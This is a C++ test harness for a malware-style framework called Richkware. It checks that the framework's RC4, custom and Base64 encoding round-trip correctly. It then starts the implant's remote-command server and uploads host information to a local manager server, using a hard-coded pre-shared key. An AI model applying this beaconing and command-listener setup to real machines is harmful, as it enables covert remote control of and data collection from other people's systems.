
#include "../src/richkware.h"
#include <assert.h>
#include <iostream>

// Global variables
std::vector<std::string> strings = {"qwerty", "343wbt3wv3", "23v45.c-55,.v32c", "43344545tbv45v2c5223v4234", "34",
                                    "- - ", ".-,", "&",
                                    "123om12jo3m12oj3c123cxo1kimxo12i3c12kcm4xi1op23m4cp1m4p12i4n1p2i4xm4po12mxm4p1o2mxpm4p21om4xpm4xp14m1po2xm41po4mxp1om4p1o2xm41po4m1p4mp12m4p1m4p1mx4x1po2m4cxp1o2m4xp12om4xp121v"};
const char *appName = "Richk";
const char *defaultEncryptionKey = "richktest"; // pre-shared key with RMS, to enable encryption before receiving a server-side generated key
const char *serverAddress = "127.0.0.1"; // Richkware-Manager-Server IP address
const char *port = "8080"; // Richkware-Manager-Server TCP port
const char *associatedUser = "richk@richk.me"; // account in RMS which is linked to
int timeoutUploadInfo = 5000;
const char *serverPort = "6000"; // Richkware Server port for CommandResponse protocol


void TEST_Crypto();

void TEST_Network();

void test(std::string s1, std::string s2);

void test(bool b);


int main() {
    //ShowWindow(GetConsoleWindow(), 1);
    std::cout << "Init test phase..." << std::endl << std::endl;

    try {
        TEST_Crypto();
        TEST_Network();
    }
    catch (std::string e) {
        std::cout << "TEST Exception: " << e << std::endl;
    }


    std::cout << std::endl << "Tests done successfully." << std::endl;
    system("pause");
    return 0;

}

void test(std::string s1, std::string s2) {
    if (s1 == s2) {
        return;
    } else {
        throw s1 + " != " + s2;
    }
}

void test(bool b) {
    if (b) {
        return;
    } else {
        throw "boolean false";
    }
}

void TEST_Crypto() {

    for (const std::string &plaintext : strings) {
        for (const std::string &key : strings) {
            std::string res = RC4EncryptDecrypt(plaintext, key);
            std::string dec = RC4EncryptDecrypt(res, key);
            //assert(plaintext == dec);
            test(plaintext, dec);
            //std::cout << plaintext << " " << dec << std::endl;

            res = Crypto::Encrypt(plaintext, key);
            dec = Crypto::Decrypt(res, key);
            //assert(plaintext == dec);
            test(plaintext, dec);
            //std::cout << plaintext << " " << dec << std::endl;

            res = Base64_encode((const unsigned char *) plaintext.c_str(), plaintext.length());
            dec = Base64_decode(res);
            assert(plaintext == dec);
        }
    }
}


void TEST_Network() {
    Richkware richkware(appName, defaultEncryptionKey, serverAddress, port, associatedUser);

    richkware.network.server.Start(serverPort, true);

    //while (true) {
    for (int i = 0; i < 2; i++) {
        if (!richkware.network.UploadInfoToRMS()) {
            throw "Network, UploadInfoToRMS";
        }
        // upload information on RMS, every 5000 seconds
        Sleep(timeoutUploadInfo);
    }

}